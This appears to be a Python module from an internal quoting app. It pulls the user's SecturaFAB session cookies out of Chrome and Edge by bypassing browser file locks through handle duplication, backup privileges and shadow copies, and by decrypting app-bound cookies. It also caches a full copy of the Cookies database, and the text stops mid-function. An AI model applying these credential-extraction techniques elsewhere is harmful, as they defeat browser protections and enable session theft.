"""Discover Kyle's SecturaFAB website session from Chrome on this PC.

Finish (POST /Quote/AddItem_DXFFiles, AddItem_PDFFiles, AddItem_Linear) needs
the www MVC cookie. The quoting PC already has that session when Kyle is
signed into Sectura in Chrome. Read Chrome (and Edge) cookies for
www.secturafab.com / secturafab.com and assemble a Cookie header.

Do not invent a paste-cookie UX. SECTURAFAB_WEBSITE_COOKIE remains a silent
env override for service accounts — never prompt anyone to paste it.
"""

from __future__ import annotations

import base64
import json
import os
import re
import shutil
import sqlite3
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from typing import Any

# Handle-dup must not pin the quoting PC. 18 chrome.exe processes * system
# handle table is unbounded; GetFinalPathNameByHandle can also stall.
_DUP_HANDLE_TIMEOUT_S = 10.0
_DUP_HANDLE_MAX_PIDS = 24
_DUP_HANDLE_MAX_HANDLES = 4000
_ABE_COCREATE_TIMEOUT_S = 2.0
_ABE_HELPER_TIMEOUT_S = 8.0
_ABE_MEMSCAN_TIMEOUT_S = 6.0
_ABE_MEMSCAN_MAX_BYTES = 256 << 20
_ABE_MEMSCAN_MAX_CAND = 20000
_ABE_MEMSCAN_MAX_REGION = 32 << 20
_ABE_PTR_MASK = 0x00007FFFFFFFFFF8
_DUP_SQLITE_PEEK_MAX = 64
_SQLITE_MAGIC = b"SQLite format 3\x00"
_SYSTEM_HANDLE_BUF_MAX = 8 << 20

SECTURA_HOST_NEEDLE = "secturafab.com"

# Auth + Cloudflare + ARR. Finish 302s without .AspNet.ApplicationCookie.
COOKIE_NAMES = (
    ".AspNet.ApplicationCookie",
    ".AspNet.Cookies",
    "ASP.NET_SessionId",
    "cf_clearance",
    "__cf_bm",
    "__cf_bm_sectura",
    "ARRAffinity",
    "ARRAffinitySameSite",
    ".AspNetCore.Cookies",
    "__RequestVerificationToken",
)

CHROME_SESSION_REQUIRED = (
    "Finish needs a live SecturaFAB Chrome session on this PC "
    "(www.secturafab.com / secturafab.com cookies). Sign into SecturaFAB in "
    "Chrome on the quoting PC, then push again. This app reads Chrome's "
    "cookies automatically — do not paste a cookie."
)

_CACHE_TTL_S = 30.0
_cache: dict[str, Any] = {
    "cookie": "",
    "ts": 0.0,
    "error": "",
    "source": "",
    "session_found": False,
    "lock_bypass": "",
    "lock_bypass_pinned": False,
    "vss": "",
    "dup_timed_out": False,
    "abe": "",
    "abe_hr": "",
    "v20_blobs": 0,
    "v20_ok": 0,
    "_v20_verify": [],
    "_app_bound_blob": None,
    "_app_bound_b64": "",
    "_appb_fp": "",
    "_appb_views": [],
    "_v10_key": None,
}

# In-process memo of Local State unwrap. Key bytes stay in RAM only.
_abe_memo: dict[str, "_BrowserKeys"] = {}


def effective_website_cookie(cfg: Any | None = None) -> str:
    """Env/config override first, else Chrome/Edge cookies on this PC."""
    explicit = getattr(cfg, "website_cookie", None) if cfg is not None else None
    if isinstance(explicit, str) and explicit.strip():
        return explicit.strip()
    env = (os.getenv("SECTURAFAB_WEBSITE_COOKIE") or "").strip()
    if env:
        return env
    return discover_sectura_website_cookie()


def discover_sectura_website_cookie(*, force: bool = False) -> str:
    """Return a Cookie header from Chrome/Edge, or '' if none is usable."""
    now = time.monotonic()
    if force:
        for sig, keys in list(_abe_memo.items()):
            if not keys.abe:
                _abe_memo.pop(sig, None)
    if (
        not force
        and _cache["cookie"]
        and (now - float(_cache["ts"] or 0)) < _CACHE_TTL_S
    ):
        return str(_cache["cookie"])
    try:
        cookie, err, source = _discover_uncached()
    except Exception as exc:  # noqa: BLE001 — never crash Finish discover
        cookie = ""
        source = str(_cache.get("source") or "")
        if not _cache.get("abe"):
            _cache["abe"] = "failed"
            _cache["abe_hr"] = type(exc).__name__
        err = (
            f"Discover failed after snapshot ({type(exc).__name__}). "
            "Fail closed — no Cookie header. Do not paste a cookie."
        )
    _cache["cookie"] = cookie
    _cache["ts"] = now
    _cache["error"] = err
    _cache["source"] = source
    _cache["session_found"] = bool(cookie)
    return cookie


def last_discover_error() -> str:
    return str(_cache.get("error") or "")


def last_discover_source() -> str:
    return str(_cache.get("source") or "")


def session_found() -> bool:
    """True when a Sectura website session cookie header is available."""
    return bool(_cache.get("session_found") or _cache.get("cookie"))


def discover_status() -> dict[str, Any]:
    """QA-safe status. Never includes cookie values or key material."""
    return {
        "session_found": session_found(),
        "source": last_discover_source(),
        "lock_bypass": str(_cache.get("lock_bypass") or ""),
        "vss": str(_cache.get("vss") or ""),
        "abe": str(_cache.get("abe") or ""),
        "abe_hr": str(_cache.get("abe_hr") or ""),
        "v20_blobs": int(_cache.get("v20_blobs") or 0),
        "v20_ok": int(_cache.get("v20_ok") or 0),
        "error": last_discover_error(),
    }


def _discover_uncached() -> tuple[str, str, str]:
    _cache["lock_bypass"] = ""
    _cache["lock_bypass_pinned"] = False
    _cache["vss"] = ""
    _cache["dup_timed_out"] = False
    _cache["abe"] = ""
    _cache["abe_hr"] = ""
    _cache["v20_blobs"] = 0
    _cache["v20_ok"] = 0
    _cache["_v20_verify"] = []
    _cache["_app_bound_blob"] = None
    _cache["_app_bound_b64"] = ""
    _cache["_appb_fp"] = ""
    _cache["_appb_views"] = []
    _cache["_v10_key"] = None
    pairs_all: list[tuple[str, str]] = []
    decrypt_failures = 0
    found_hosts = 0
    source = ""
    snapshot_errors: list[str] = []
    for profile in _browser_cookie_dbs():
        label = str(profile.get("label") or "profile")
        try:
            rows = _read_cookie_rows(profile)
        except (OSError, sqlite3.Error) as exc:
            if not source:
                source = label
            snapshot_errors.append(f"{label}: {_snapshot_error_text(exc)}")
            continue
        if not rows:
            continue
        found_hosts += 1
        if not source:
            source = label
        _cache["source"] = source
        samples = _v20_samples_from_rows(rows)
        _cache["_v20_verify"] = samples
        sample = samples[0] if samples else None
        try:
            keys = _browser_keys(profile["local_state"], v20_sample=sample)
        except Exception as exc:  # noqa: BLE001 — ABE must not abort discover
            hr = type(exc).__name__
            _cache["abe"] = "failed"
            _cache["abe_hr"] = hr
            keys = _BrowserKeys(status="failed", hr=hr)
        if keys.status and not _cache["abe"]:
            _cache["abe"] = keys.status
            _cache["abe_hr"] = keys.hr
        elif keys.status in {"elevator", "chrome_dir"}:
            _cache["abe"] = keys.status
            _cache["abe_hr"] = keys.hr
        for host, name, value, encrypted in rows:
            del host
            if encrypted[:3] == b"v20":
                _cache["v20_blobs"] = int(_cache["v20_blobs"] or 0) + 1
            plain = (value or "").strip()
            if not plain and encrypted:
                if encrypted[:3] == b"v20" and keys.abe:
                    raw = _aes_gcm_decrypt_bytes(encrypted[3:], keys.abe)
                    if raw:
                        _cache["v20_ok"] = int(_cache["v20_ok"] or 0) + 1
                        plain = _v20_cookie_text(raw)
                    else:
                        decrypt_failures += 1
                        continue
                else:
                    plain = _decrypt_cookie_value(encrypted, keys)
                    if not plain:
                        decrypt_failures += 1
                        continue
                    if encrypted[:3] == b"v20":
                        _cache["v20_ok"] = int(_cache["v20_ok"] or 0) + 1
            if name and plain:
                pairs_all.append((name, plain))
        if pairs_all:
            source = label
            break
    header = _assemble_cookie_header(pairs_all)
    if header:
        return header, "", source
    if found_hosts and decrypt_failures:
        abe = str(_cache.get("abe") or "failed")
        hr = str(_cache.get("abe_hr") or "")
        return (
            "",
            "Found SecturaFAB v20 cookies but app-bound decrypt failed "
            f"(abe={abe}"
            + (f" hr={hr}" if hr else "")
            + "). chrome_dir helper could not unwrap Local State. Fail closed — "
            "no Cookie header. Do not paste a cookie.",
            source,
        )
    if found_hosts:
        return (
            "",
            "Chrome has a SecturaFAB host entry but no usable session cookie.",
            source,
        )
    if snapshot_errors:
        bypass = str(_cache.get("lock_bypass") or "none")
        vss = str(_cache.get("vss") or "missing")
        if "vss=" not in bypass and bypass != "vss":
            bypass = f"vss={vss};{bypass}"
        return (
            "",
            "Could not snapshot Chrome Cookies while the browser is open "
            f"(lock_bypass={bypass}; {'; '.join(snapshot_errors)}). "
            "Do not paste a cookie.",
            source,
        )
    return (
        "",
        "No Chrome/Edge cookies for www.secturafab.com on this PC.",
        "",
    )


def _safe_os_error(exc: BaseException) -> str:
    """WinError / errno / NTSTATUS only — never cookie material."""
    detail = ""
    if getattr(exc, "args", None) and len(exc.args) > 1:
        detail = _safe_snapshot_detail(str(exc.args[1]))
    win = getattr(exc, "winerror", None)
    if win is not None:
        code = f"WinError {win}"
    else:
        err = getattr(exc, "errno", None)
        if err is None:
            code = type(exc).__name__
        elif int(err) > 65535 or int(err) < 0:
            code = f"NTSTATUS {_hr_hex(int(err))}"
        else:
            code = f"errno {err}"
    if detail in {
        "dup_handle_timeout",
        "dup_handle_not_found",
        "ReadFile failed",
        "CreateFileW failed",
    }:
        return f"{code}:{detail}"
    return code


def _safe_snapshot_detail(text: str) -> str:
    """Keep method names and WinError/errno. Strip anything else."""
    allowed = set(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_.:;=/() -"
    )
    cleaned = "".join(ch if ch in allowed else " " for ch in (text or ""))
    return " ".join(cleaned.split())[:500]


def _snapshot_error_text(exc: BaseException) -> str:
    """Prefer the snapshot method chain over a bare OSError type name."""
    detail = _safe_snapshot_detail(str(exc))
    if detail and detail not in {"OSError", "Error", "sqlite3.Error"}:
        return detail
    return _safe_os_error(exc)


def _browser_cookie_dbs() -> list[dict[str, Path | str | bool]]:
    roots: list[tuple[str, Path]] = []
    local = os.environ.get("LOCALAPPDATA") or ""
    if local:
        roots.append(("chrome", Path(local) / "Google" / "Chrome" / "User Data"))
        roots.append(("edge", Path(local) / "Microsoft" / "Edge" / "User Data"))
    # Linux / this cloud VM — only used if someone copied a profile here.
    home = Path.home()
    roots.append(("chrome", home / ".config" / "google-chrome"))
    roots.append(("chrome", home / ".config" / "chromium"))

    out: list[dict[str, Path | str | bool]] = []
    seen: set[str] = set()
    for label, root in roots:
        if not root.is_dir():
            continue
        local_state = root / "Local State"
        for profile_dir in _profile_dirs(root):
            cookies = _cookies_db_path(profile_dir)
            if cookies is None:
                continue
            key = str(cookies)
            if key in seen:
                continue
            seen.add(key)
            out.append(
                {
                    "label": f"{label}:{profile_dir.name}",
                    "cookies": cookies,
                    "local_state": local_state,
                    "profile_dir": profile_dir,
                    "history_hit": _history_has_sectura(profile_dir),
                }
            )
    out.sort(key=_profile_rank)
    return out


def _cookies_db_path(profile_dir: Path) -> Path | None:
    for cookies in (
        profile_dir / "Network" / "Cookies",
        profile_dir / "Cookies",
    ):
        if cookies.is_file():
            return cookies
    return None


def _profile_rank(profile: dict[str, Path | str | bool]) -> tuple[int, int, int]:
    """Chrome Default first (History on Default beats empty Profile 1)."""
    label = str(profile.get("label") or "")
    browser, _, name = label.partition(":")
    is_chrome = 0 if browser == "chrome" else 1
    is_default = 0 if name == "Default" else 1
    history = 0 if profile.get("history_hit") else 1
    return (is_chrome, is_default, history)


def _profile_dirs(root: Path) -> list[Path]:
    names = ["Default"]
    try:
        names.extend(
            sorted(
                p.name
                for p in root.iterdir()
                if p.is_dir() and p.name.startswith("Profile")
            )
        )
    except OSError:
        pass
    return [root / n for n in names if (root / n).is_dir()]


def _history_has_sectura(profile_dir: Path) -> bool:
    history = Path(profile_dir) / "History"
    if not history.is_file():
        return False
    tmp_dir = tempfile.mkdtemp(prefix="kannon-chrome-history-")
    try:
        dest = Path(tmp_dir) / "History"
        _snapshot_sqlite_file(
            history, dest, allow_vss=False, allow_lock_bypass=False
        )
        conn = sqlite3.connect(str(dest))
        try:
            row = conn.execute(
                "SELECT 1 FROM urls WHERE url LIKE ? LIMIT 1",
                (f"%{SECTURA_HOST_NEEDLE}%",),
            ).fetchone()
            return bool(row)
        finally:
            conn.close()
    except (OSError, sqlite3.Error):
        return False
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def _is_chrome_default(label: str) -> bool:
    return label == "chrome:Default"


def _set_lock_bypass(value: str, *, pin: bool = False) -> None:
    """Record lock_bypass. After Chrome Default, later profiles must not wipe it."""
    if _cache.get("lock_bypass_pinned"):
        return
    _cache["lock_bypass"] = value
    if pin:
        _cache["lock_bypass_pinned"] = True


def _record_vss(reason: str) -> None:
    _cache["vss"] = _safe_snapshot_detail(reason)[:80]


def _lock_bypass_with_vss(rest: str) -> str:
    """lock_bypass must include vss=… (ok / create HRESULT / skip reason)."""
    vss = str(_cache.get("vss") or "skipped")
    prefix = "vss" if vss == "ok" else f"vss={vss}"
    rest = (rest or "").strip()
    if not rest or rest in {prefix, "vss"}:
        return prefix
    if rest.startswith("vss=") or rest.startswith("vss;") or rest == "vss":
        return rest
    return f"{prefix};{rest}"


def _read_cookie_rows(
    profile: dict[str, Path | str | bool],
) -> list[tuple[str, str, str, bytes]]:
    src = Path(profile["cookies"])
    tmp_dir = tempfile.mkdtemp(prefix="kannon-chrome-cookies-")
    label = str(profile.get("label") or "")
    is_default = _is_chrome_default(label)
    try:
        dest = Path(tmp_dir) / "Cookies"
        last_exc: BaseException | None = None
        method = ""
        if is_default and _try_nolock_copy(src, dest):
            method = "nolock"
        elif is_default and _try_handle_dup_copy(src, dest):
            method = "dup_handle"
        elif is_default and _try_vss_create_copy(src, dest):
            method = "vss"
        else:
            for attempt in range(2):
                try:
                    _snapshot_sqlite_file(
                        src,
                        dest,
                        allow_vss=True,
                        allow_lock_bypass=is_default,
                    )
                    last_exc = None
                    method = str(_cache.get("lock_bypass") or "snapshot")
                    break
                except (OSError, sqlite3.Error) as exc:
                    last_exc = exc
                    time.sleep(0.35)
            if last_exc is not None and is_default and _try_cached_cookie_copy(dest):
                last_exc = None
                method = "cached"
            if last_exc is not None:
                if is_default:
                    _set_lock_bypass(
                        _lock_bypass_with_vss(str(_cache.get("lock_bypass") or method)),
                        pin=True,
                    )
                raise last_exc
        if is_default:
            _set_lock_bypass(_lock_bypass_with_vss(method or "snapshot"), pin=True)
            if method != "cached":
                _persist_cookie_snapshot(dest)
        conn = sqlite3.connect(str(dest))
        try:
            cur = conn.execute(
                "SELECT host_key, name, value, encrypted_value FROM cookies "
                "WHERE host_key LIKE ?",
                (f"%{SECTURA_HOST_NEEDLE}%",),
            )
            rows: list[tuple[str, str, str, bytes]] = []
            for host, name, value, encrypted in cur.fetchall():
                blob = encrypted if isinstance(encrypted, (bytes, bytearray)) else b""
                rows.append((str(host or ""), str(name or ""), str(value or ""), bytes(blob)))
            return rows
        finally:
            conn.close()
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def _snapshot_sqlite_file(
    src: Path, dest: Path, *, allow_vss: bool = True, allow_lock_bypass: bool = True
) -> None:
    """Copy a Chrome SQLite DB that may be locked (WinError 32)."""
    errors: list[str] = []
    methods: list[tuple[str, Any]] = [
        ("nolock", _sqlite_backup_nolock),
        ("share", _share_copy_with_wal),
    ]
    if allow_lock_bypass:
        methods.append(
            (
                "lock_bypass",
                lambda s, d: _win_lock_bypass_with_wal(s, d, allow_vss=allow_vss),
            )
        )
    methods.append(("shutil", _shutil_copy_with_wal))
    for name, fn in methods:
        try:
            if dest.exists():
                dest.unlink()
            fn(src, dest)
            if dest.is_file() and dest.stat().st_size > 0:
                if name != "lock_bypass" or not _cache.get("lock_bypass"):
                    _set_lock_bypass(str(_cache.get("lock_bypass") or name))
                return
            errors.append(f"{name}: empty")
        except (OSError, sqlite3.Error) as exc:
            errors.append(f"{name}: {_snapshot_error_text(exc)}")
            for leftover in dest.parent.glob(dest.name + "*"):
                try:
                    leftover.unlink()
                except OSError:
                    pass
    detail = "; ".join(errors) or "no snapshot method ran"
    if not _cache.get("lock_bypass"):
        _set_lock_bypass(_safe_snapshot_detail(detail))
    raise OSError(32, _safe_snapshot_detail(detail))


def _sqlite_backup_nolock(src: Path, dest: Path) -> None:
    """sqlite backup via share/nolock URI — landed Cookies with Chrome closed."""
    last: BaseException | None = None
    for extra in ("?mode=ro&nolock=1&immutable=1", "?mode=ro&nolock=1"):
        src_uri = src.resolve().as_uri() + extra
        src_conn = None
        dest_conn = None
        try:
            src_conn = sqlite3.connect(src_uri, uri=True, timeout=1.0)
            dest_conn = sqlite3.connect(str(dest))
            src_conn.backup(dest_conn)
            dest_conn.commit()
            return
        except (OSError, sqlite3.Error) as exc:
            last = exc
        finally:
            if dest_conn is not None:
                dest_conn.close()
            if src_conn is not None:
                src_conn.close()
    if last is not None:
        raise last
    raise OSError(32, "nolock backup failed")


def _try_nolock_copy(src: Path, dest: Path) -> bool:
    """True when sqlite nolock actually wrote a cookies table."""
    try:
        if dest.exists():
            dest.unlink()
        _sqlite_backup_nolock(src, dest)
    except (OSError, sqlite3.Error):
        return False
    return dest.is_file() and dest.stat().st_size > 0 and _sqlite_has_cookie_table(dest)


def _cookie_snapshot_cache_dir() -> Path | None:
    env = (os.getenv("KANNON_COOKIE_CACHE") or "").strip()
    if env:
        return Path(env)
    if os.name != "nt":
        return None
    local = (os.getenv("LOCALAPPDATA") or "").strip()
    if local:
        return Path(local) / "KannonQuote" / "chrome-session"
    return None


def _persist_cookie_snapshot(src: Path) -> None:
    """Keep a Cookies DB that already landed so Chrome-open can decrypt later."""
    if not _sqlite_has_cookie_table(src):
        return
    cache = _cookie_snapshot_cache_dir()
    if cache is None:
        return
    try:
        cache.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src, cache / "Cookies")
    except OSError:
        return


def _try_cached_cookie_copy(dest: Path) -> bool:
    cache_dir = _cookie_snapshot_cache_dir()
    if cache_dir is None:
        return False
    cache = cache_dir / "Cookies"
    if not _sqlite_has_cookie_table(cache):
        return False
    try:
        if dest.exists():
            dest.unlink()
        shutil.copy2(cache, dest)
    except OSError:
        return False
    return _sqlite_has_cookie_table(dest)


def _share_copy_with_wal(src: Path, dest: Path) -> None:
    _copy_shared(src, dest)
    for suffix in ("-wal", "-shm", "-journal"):
        side = Path(str(src) + suffix)
        if not side.is_file():
            continue
        try:
            _copy_shared(side, dest.parent / (dest.name + suffix))
        except OSError:
            continue


def _shutil_copy_with_wal(src: Path, dest: Path) -> None:
    shutil.copy2(src, dest)
    for suffix in ("-wal", "-shm", "-journal"):
        side = Path(str(src) + suffix)
        if side.is_file():
            try:
                shutil.copy2(side, dest.parent / (dest.name + suffix))
            except OSError:
                continue


def _copy_shared(src: Path, dest: Path) -> None:
    """Copy bytes from a file Chrome may have open (FILE_SHARE_READ|WRITE)."""
    if os.name == "nt":
        _win_share_copy(src, dest)
        return
    with src.open("rb") as inf, dest.open("wb") as out:
        while True:
            chunk = inf.read(1024 * 1024)
            if not chunk:
                break
            out.write(chunk)


def _win_lock_bypass_with_wal(src: Path, dest: Path, *, allow_vss: bool = True) -> None:
    """Bypass exclusive Chrome locks: handle dup, backup, VSS."""
    if os.name != "nt":
        raise OSError(32, "lock bypass is Windows-only")
    last: OSError | None = None
    trail: list[str] = []
    methods: list[tuple[str, Any]] = [
        ("dup_handle", _win_dup_handle_copy),
        ("backup_priv", _win_backup_copy),
        ("nt_backup", _win_ntcreatefile_backup_copy),
    ]
    if allow_vss:
        methods.append(("vss", _win_vss_copy))
    methods.extend(
        (
            ("vss_existing", _win_vss_existing_copy),
            ("esentutl", _win_esentutl_copy),
            ("robocopy_b", _win_robocopy_backup_copy),
        )
    )
    if _cache.get("dup_timed_out"):
        methods = [(n, fn) for n, fn in methods if n != "dup_handle"]
        trail.append("dup_handle_timeout")
    for name, fn in methods:
        try:
            if dest.exists():
                dest.unlink()
            fn(src, dest)
            if dest.is_file() and dest.stat().st_size > 0:
                for suffix in ("-wal", "-shm", "-journal"):
                    side = Path(str(src) + suffix)
                    if not side.is_file():
                        continue
                    try:
                        fn(side, dest.parent / (dest.name + suffix))
                    except OSError:
                        continue
                _set_lock_bypass(name)
                return
            trail.append(f"{name}: empty")
        except OSError as exc:
            last = exc
            detail = str(exc.args[1] if len(exc.args) > 1 else exc)
            if name == "dup_handle" and "dup_handle_timeout" in detail:
                trail.append("dup_handle_timeout")
                _cache["dup_timed_out"] = True
            elif name == "dup_handle" and "dup_handle_not_found" in detail:
                trail.append("dup_handle_not_found")
            else:
                trail.append(f"{name}:{_safe_os_error(exc)}")
            if dest.exists():
                try:
                    dest.unlink()
                except OSError:
                    pass
    _set_lock_bypass(";".join(trail) or "none")
    raise last or OSError(32, ";".join(trail) or "Windows lock bypass failed")


def _win_backup_copy(src: Path, dest: Path) -> None:
    """CreateFileW + FILE_FLAG_BACKUP_SEMANTICS after enabling SeBackupPrivilege."""
    _enable_privilege("SeBackupPrivilege")
    _win_createfile_copy(src, dest, flags=0x02000000)  # FILE_FLAG_BACKUP_SEMANTICS


def _enable_privilege(name: str) -> None:
    import ctypes
    from ctypes import wintypes

    token_adjust = 0x0020
    token_query = 0x0008
    se_privilege_enabled = 0x00000002
    advapi = ctypes.WinDLL("advapi32", use_last_error=True)
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    class LUID(ctypes.Structure):
        _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", ctypes.c_long)]

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [
            ("PrivilegeCount", wintypes.DWORD),
            ("Privileges", LUID_AND_ATTRIBUTES * 1),
        ]

    token = wintypes.HANDLE()
    if not kernel32.OpenProcessToken(
        kernel32.GetCurrentProcess(),
        token_adjust | token_query,
        ctypes.byref(token),
    ):
        raise OSError(ctypes.get_last_error() or 5, "OpenProcessToken failed")
    try:
        luid = LUID()
        if not advapi.LookupPrivilegeValueW(None, name, ctypes.byref(luid)):
            raise OSError(ctypes.get_last_error() or 1313, "LookupPrivilegeValue failed")
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = se_privilege_enabled
        if not advapi.AdjustTokenPrivileges(token, False, ctypes.byref(tp), 0, None, None):
            raise OSError(ctypes.get_last_error() or 5, "AdjustTokenPrivileges failed")
        err = ctypes.get_last_error()
        if err == 1300:  # ERROR_NOT_ALL_ASSIGNED
            raise OSError(1300, "SeBackupPrivilege not held")
    finally:
        kernel32.CloseHandle(token)


def _kernel32():
    """kernel32 with pointer-width HANDLE prototypes (Win64 LLP64)."""
    import ctypes
    from ctypes import wintypes

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel32.CreateFileW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.HANDLE,
    ]
    kernel32.CreateFileW.restype = wintypes.HANDLE
    kernel32.ReadFile.argtypes = [
        wintypes.HANDLE,
        wintypes.LPVOID,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
        wintypes.LPVOID,
    ]
    kernel32.ReadFile.restype = wintypes.BOOL
    kernel32.SetFilePointer.argtypes = [
        wintypes.HANDLE,
        wintypes.LONG,
        wintypes.PLONG,
        wintypes.DWORD,
    ]
    kernel32.SetFilePointer.restype = wintypes.DWORD
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel32.CloseHandle.restype = wintypes.BOOL
    kernel32.GetFileType.argtypes = [wintypes.HANDLE]
    kernel32.GetFileType.restype = wintypes.DWORD
    kernel32.GetFinalPathNameByHandleW.argtypes = [
        wintypes.HANDLE,
        wintypes.LPWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
    ]
    kernel32.GetFinalPathNameByHandleW.restype = wintypes.DWORD
    kernel32.GetFileSizeEx.argtypes = [wintypes.HANDLE, ctypes.POINTER(ctypes.c_longlong)]
    kernel32.GetFileSizeEx.restype = wintypes.BOOL
    kernel32.CreateFileMappingW.argtypes = [
        wintypes.HANDLE,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.LPCWSTR,
    ]
    kernel32.CreateFileMappingW.restype = wintypes.HANDLE
    kernel32.MapViewOfFile.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.c_size_t,
    ]
    kernel32.MapViewOfFile.restype = wintypes.LPVOID
    kernel32.UnmapViewOfFile.argtypes = [wintypes.LPCVOID]
    kernel32.UnmapViewOfFile.restype = wintypes.BOOL
    kernel32.GetFileInformationByHandleEx.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.DWORD,
    ]
    kernel32.GetFileInformationByHandleEx.restype = wintypes.BOOL
    kernel32.BackupRead.argtypes = [
        wintypes.HANDLE,
        wintypes.LPVOID,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
        wintypes.BOOL,
        wintypes.BOOL,
        ctypes.POINTER(ctypes.c_void_p),
    ]
    kernel32.BackupRead.restype = wintypes.BOOL
    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    kernel32.OpenProcess.restype = wintypes.HANDLE
    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    return kernel32


def _win_createfile_copy(src: Path, dest: Path, *, flags: int = 0x80) -> None:
    import ctypes
    from ctypes import wintypes

    generic_read = 0x80000000
    share = 0x00000001 | 0x00000002 | 0x00000004
    open_existing = 3
    invalids = {-1, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF}

    kernel32 = _kernel32()
    handle = kernel32.CreateFileW(
        _win_long_path(src),
        generic_read,
        share,
        None,
        open_existing,
        int(flags),
        None,
    )
    hid = int(handle) if handle is not None else -1
    if hid in invalids or hid == 0:
        raise OSError(ctypes.get_last_error() or 32, "CreateFileW failed")
    try:
        _read_handle_to_file(handle, dest)
    finally:
        kernel32.CloseHandle(wintypes.HANDLE(handle))


def _win_long_path(src: Path) -> str:
    text = str(src.resolve()).replace("/", "\\")
    if text.startswith("\\\\?\\"):
        return text
    if text.startswith("\\\\"):
        return "\\\\?\\UNC\\" + text[2:]
    return "\\\\?\\" + text


def _nt_native_path(src: Path | str) -> str:
    """DOS path → \\??\\C:\\... for NtCreateFile. Never keep a \\\\?\\ prefix."""
    text = str(src)
    if hasattr(src, "resolve"):
        try:
            text = str(src.resolve())
        except OSError:
            text = str(src)
    text = text.replace("/", "\\")
    if text.startswith("\\\\?\\UNC\\"):
        text = "\\" + text[7:]
    elif text.startswith("\\\\?\\"):
        text = text[4:]
    if text.startswith("\\??\\"):
        return text
    if text.startswith("\\\\"):
        return "\\??\\UNC\\" + text[2:]
    return "\\??\\" + text


def _read_handle_to_file(handle: Any, dest: Path) -> None:
    import ctypes
    from ctypes import wintypes

    kernel32 = _kernel32()
    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
    kernel32.SetFilePointer(h, 0, None, 0)
    buf = ctypes.create_string_buffer(1024 * 1024)
    done = wintypes.DWORD(0)
    wrote = 0
    with dest.open("wb") as out:
        while True:
            ok = kernel32.ReadFile(h, buf, len(buf), ctypes.byref(done), None)
            if not ok:
                raise OSError(ctypes.get_last_error() or 32, "ReadFile failed")
            if done.value == 0:
                break
            out.write(buf.raw[: done.value])
            wrote += done.value
    if wrote <= 0:
        raise OSError(32, "ReadFile returned 0 bytes")


def _backup_read_handle_to_file(handle: Any, dest: Path) -> None:
    """BackupRead on an already-open handle when ReadFile hits sharing 32."""
    import ctypes
    from ctypes import wintypes

    kernel32 = _kernel32()
    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
    ctx = ctypes.c_void_p()
    buf = ctypes.create_string_buffer(1024 * 1024)
    done = wintypes.DWORD(0)
    wrote = 0
    try:
        with dest.open("wb") as out:
            while True:
                ok = kernel32.BackupRead(
                    h, buf, len(buf), ctypes.byref(done), False, False, ctypes.byref(ctx)
                )
                if not ok:
                    raise OSError(ctypes.get_last_error() or 32, "BackupRead failed")
                if done.value == 0:
                    break
                out.write(buf.raw[: done.value])
                wrote += done.value
    finally:
        if ctx:
            kernel32.BackupRead(
                h, None, 0, ctypes.byref(done), True, False, ctypes.byref(ctx)
            )
    if wrote <= 0:
        raise OSError(32, "BackupRead returned 0 bytes")


def _mapview_handle_to_file(handle: Any, dest: Path) -> None:
    """Chrome memory-maps Cookies. MapViewOfFile works when ReadFile hits 32."""
    import ctypes
    from ctypes import wintypes

    kernel32 = _kernel32()
    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
    size = _handle_file_size(h)
    if not size or size < 64:
        raise OSError(32, "mapview no size")
    invalids = {0, -1, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF}
    last_err = 32
    for protect, access in ((0x02, 0x0004), (0x08, 0x0001)):
        mapping = kernel32.CreateFileMappingW(h, None, protect, 0, 0, None)
        mid = int(mapping) if mapping is not None else 0
        if mid in invalids:
            last_err = ctypes.get_last_error() or last_err
            continue
        try:
            view = kernel32.MapViewOfFile(mapping, access, 0, 0, 0)
            if not view:
                last_err = ctypes.get_last_error() or last_err
                continue
            try:
                dest.write_bytes(ctypes.string_at(view, int(size)))
            finally:
                kernel32.UnmapViewOfFile(view)
        finally:
            kernel32.CloseHandle(mapping)
        if dest.is_file() and dest.stat().st_size >= 64:
            return
    raise OSError(last_err, "MapViewOfFile failed")


def _copy_dup_handle_bytes(handle: Any, dest: Path) -> None:
    last: OSError | None = None
    for fn in (_mapview_handle_to_file, _read_handle_to_file, _backup_read_handle_to_file):
        try:
            fn(handle, dest)
            if dest.is_file() and dest.stat().st_size > 0:
                return
        except OSError as exc:
            last = exc
            try:
                dest.unlink()
            except OSError:
                pass
    if last is not None:
        raise last
    raise OSError(32, "dup handle read failed")


def _win_dup_handle_copy(src: Path, dest: Path) -> None:
    """Duplicate the Cookies handle, or raise dup_handle_timeout after a few seconds."""
    done = threading.Event()
    err: list[BaseException] = []

